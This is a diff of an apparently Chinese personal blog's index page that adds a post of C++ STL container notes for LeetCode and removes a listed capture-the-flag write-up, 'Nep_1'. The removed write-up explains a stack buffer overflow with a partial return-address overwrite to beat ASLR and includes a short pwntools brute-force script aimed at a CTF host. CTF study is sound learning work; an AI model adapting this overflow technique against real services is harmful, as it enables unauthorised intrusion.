@@ -116,12 +116,12 @@
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">4</span></a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">5</span></a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">33</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">34</span></a>
 
   </li>
   </ul>
@@ -147,6 +147,82 @@
 
           <div class="content index posts-expand">
             
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/09/%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="带废物">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="全宇宙最蒻的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/05/09/%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C/" class="post-title-link" itemprop="url">准备工作</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-05-09 10:43:44 / Modified: 11:47:18" itemprop="dateCreated datePublished" datetime="2021-05-09T10:43:44+08:00">2021-05-09</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>在leetcode上用C++提交代码需要学习一点点的class相关知识，还要熟悉题目提供的容器，以下</p>
+<h1 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h1><p>应该是使用了万用头，但在本地调试的时候需要手动添加头文件</p>
+<h1 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h1><p>每个容器都提供了很多方法，这里只介绍最适用于这种数据结构的一些方法，并且在做题时候会常用的一些方法。</p>
+<h2 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h2><p>vector 容器和数组是一样的，基本上除非题目输入定义了vector类型，自己也不太会引入vector。毕竟要多打很多字。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义：</span></span><br><span class="line"><span class="built_in">vector</span> &lt;<span class="keyword">int</span>&gt; v;</span><br><span class="line"><span class="comment">//访问：</span></span><br><span class="line">v[i];</span><br><span class="line"><span class="comment">//更新</span></span><br><span class="line">v[i]=a;</span><br><span class="line"><span class="comment">//大小</span></span><br><span class="line">v.size();</span><br><span class="line"><span class="comment">//末尾插入</span></span><br><span class="line">v.push_back(a);</span><br><span class="line"><span class="comment">//末尾删除</span></span><br><span class="line">v.pop_back();</span><br><span class="line"><span class="comment">//清空</span></span><br><span class="line">v.clear();</span><br><span class="line"><span class="comment">//判断空</span></span><br><span class="line">v.empty();</span><br><span class="line"><span class="comment">//排序</span></span><br><span class="line">sort(v.begin(),v.end());<span class="comment">//从小到大</span></span><br><span class="line">sort(v.rbegin(),v.rend());<span class="comment">//从大到小</span></span><br><span class="line"><span class="comment">//自定义排序</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">compare</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="keyword">return</span> a&lt; b; <span class="comment">//升序排列，如果改为return a&gt;b，则为降序 </span></span><br><span class="line">&#125; </span><br><span class="line">sort(v.begin(),v.end(),compare);</span><br><span class="line"><span class="comment">//翻转</span></span><br><span class="line">reverse(v.begin(),v.end());</span><br></pre></td></tr></table></figure></p>
+<h2 id="set，multiset"><a href="#set，multiset" class="headerlink" title="set，multiset"></a>set，multiset</h2><p>set主要作用是自动去重，对于期望得到不重复的结果，使用set维护输出列表。由于set，multiset通过平衡二叉树实现，有自动排序功能。set不允许重复，multiset允许重复<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义</span></span><br><span class="line"><span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt; s;</span><br><span class="line"><span class="comment">//添加元素</span></span><br><span class="line">s.insert(i);</span><br><span class="line"><span class="comment">//删除元素</span></span><br><span class="line">s.erase(i);</span><br><span class="line"><span class="comment">//查找元素 返回指针</span></span><br><span class="line">s.find(i);</span><br><span class="line"><span class="comment">//大小</span></span><br><span class="line">s.size();</span><br><span class="line"><span class="comment">//遍历</span></span><br><span class="line"><span class="keyword">for</span>(<span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt;::iterator it=s.begin(); it!=s.end();it++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;*it&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//范围查找</span></span><br><span class="line">m.lower_bound(elem);</span><br><span class="line">m.upper_bound(elem);</span><br></pre></td></tr></table></figure></p>
+<p>注：</p>
+<p>c++ vector和set的区别</p>
+<p>STL中的容器可以分为两大类：<br>1、顺序容器：list，queue，vector<br>2、关联容器：map，set（当然对应的有multimap，multiset）<br>其中vector的存储结构是数组，其它的存储结构是链表。</p>
+<p>首先vector属于顺序容器，其元素与存储位置与操作操作有关；set属于关联容器，其元素相当于键值。set能够保证它里面所有的元素都是不重复的（multiset除外）。</p>
+<p>其次，由于存储结构不同，vector擅长于解决某个位置是什么值的问题，而set擅长于解决，某个元素在那个位置的问题，知道元素的内容，查找它的位置。因此vector特别好的支持随机访问，而set不支持（不支持下标访问）。</p>
+<h2 id="map，multimap，hashmap"><a href="#map，multimap，hashmap" class="headerlink" title="map，multimap，hashmap"></a>map，multimap，hashmap</h2><p>map是一个使用键值对key-value 模式的容器，map不允许重复键值，而multimap允许重复键值。适用于词频统计类的问题。map的底层是红黑树。<br>hashmap操作与map相同，但是底层是hash表，可以在O(1)时间内完成访问操作。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义</span></span><br><span class="line"><span class="built_in">map</span>&lt;<span class="keyword">char</span>*, <span class="keyword">int</span>&gt; m;</span><br><span class="line"><span class="comment">//插入</span></span><br><span class="line">m.insert(<span class="built_in">pair</span>&lt;<span class="keyword">char</span> *, <span class="keyword">int</span>&gt;(key,value))</span><br><span class="line">m[key]=value;</span><br><span class="line"><span class="comment">//删除 </span></span><br><span class="line">m.erase(key);</span><br><span class="line"><span class="comment">//访问</span></span><br><span class="line">m[key];<span class="comment">//如果没有这个key，则返回0</span></span><br><span class="line"><span class="comment">//遍历</span></span><br><span class="line"><span class="keyword">for</span>(<span class="built_in">map</span>&lt;<span class="keyword">char</span> *,<span class="keyword">int</span>&gt;::iterator it=m.begin();it!=m.end();it++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;it-&gt;first&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;it-&gt;second&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//大小</span></span><br><span class="line">m.size();</span><br><span class="line"><span class="comment">//清空</span></span><br><span class="line">m.clear();</span><br></pre></td></tr></table></figure>
+<h1 id="常用类"><a href="#常用类" class="headerlink" title="常用类"></a>常用类</h1><h2 id="string"><a href="#string" class="headerlink" title="string"></a>string</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//构造</span></span><br><span class="line"><span class="built_in">string</span> s=<span class="string">&quot;123&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> *a=<span class="string">&quot;123&quot;</span>;</span><br><span class="line"><span class="built_in">string</span> s = a;</span><br><span class="line"><span class="comment">//拼接</span></span><br><span class="line">a+b</span><br><span class="line"><span class="comment">//子串</span></span><br><span class="line">a.substr(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line"><span class="comment">//查找</span></span><br><span class="line">a.find(<span class="string">&quot;12&quot;</span>);<span class="comment">//返回字串第一个字符的下标，如果没有找到，返回string::npos</span></span><br><span class="line"><span class="comment">//替换</span></span><br><span class="line">a.replace(<span class="number">1</span>,<span class="number">2</span>,<span class="string">&quot;ab&quot;</span>); <span class="comment">//ab3</span></span><br><span class="line"><span class="comment">//删除子串</span></span><br><span class="line">a.erase(<span class="number">1</span>,<span class="number">2</span>); <span class="comment">//3</span></span><br><span class="line"><span class="comment">//长度</span></span><br><span class="line">a.size();</span><br><span class="line"><span class="comment">//访问</span></span><br><span class="line">a[i];</span><br><span class="line"><span class="comment">//转成char *</span></span><br><span class="line">a.c_str();</span><br></pre></td></tr></table></figure>
+<h1 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h1><p>遇到再说</p>
+<p>注：部分转载于：<a target="_blank" rel="noopener" href="https://blog.csdn.net/yao09605/article/details/106156743">https://blog.csdn.net/yao09605/article/details/106156743</a></p>
+<p>注：STL应在 学会在C里手写 后使用</p>
+<h1 id="VS本地配置"><a href="#VS本地配置" class="headerlink" title="VS本地配置"></a>VS本地配置</h1><p>首先简化输入输出，实现某算法的功能后移植到类中</p>
+<p>eg1：第一题</p>
+<img src="/2021/05/09/%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C/1.png" class>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -869,82 +945,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/24/Nep-1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="带废物">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="全宇宙最蒻的博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/03/24/Nep-1/" class="post-title-link" itemprop="url">Nep_1</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2021-03-24 15:50:52" itemprop="dateCreated datePublished" datetime="2021-03-24T15:50:52+08:00">2021-03-24</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-04-10 16:45:44" itemprop="dateModified" datetime="2021-04-10T16:45:44+08:00">2021-04-10</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>程序开启了随机地址保护——<strong>但随机地址不包括低三位的地址</strong></p>
-<img src="/2021/03/24/Nep-1/3.png" class>
-<img src="/2021/03/24/Nep-1/2.png" class>
-<p>v4用于接收我们的输入数据，能存放8个字节</p>
-<p>sub_10D0猜测是read函数，因为语法还有对应的汇编代码极其相似</p>
-<p>所以输入8个字节的数据覆盖v4，在输入8个字节覆盖 保存的ebp（因为程序是64位，所以ebp为8个字节），接下来就可以返回地址覆盖上所需跳转的地址。</p>
-<img src="/2021/03/24/Nep-1/1.png" class>
-<p>这里是想要跳转到底地址，可以输出flag的函数。</p>
-<p>但程序开启了ASLR，除了低3位的地址以外其余全是扯淡，所以记录下这个函数的开头的第三位地址，但整个程序的的地址也才4位，所以可以随机选一个第四位地址，多次打击，欧拉欧拉欧拉欧拉欧拉欧拉欧拉欧拉欧拉欧拉欧拉欧拉欧拉欧拉，1/16的概率能打中。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	io = remote(<span class="string">&quot;node2.hackingfor.fun&quot;</span>,<span class="number">36058</span>)</span><br><span class="line">	io.send(<span class="string">&quot;a&quot;</span>*<span class="number">16</span>+p16(<span class="number">0x64e1</span>))</span><br><span class="line">	res = io.recvall()</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> res</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<p>p64()——8个字节<br>p32()——4个字节<br>p16()——2个字节</p>
-<p>为什么要用p16()不知道，猜测和程序的栈溢出保护有关。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1014,14 +1014,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">33</span>
+          <span class="site-state-item-count">34</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">5</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
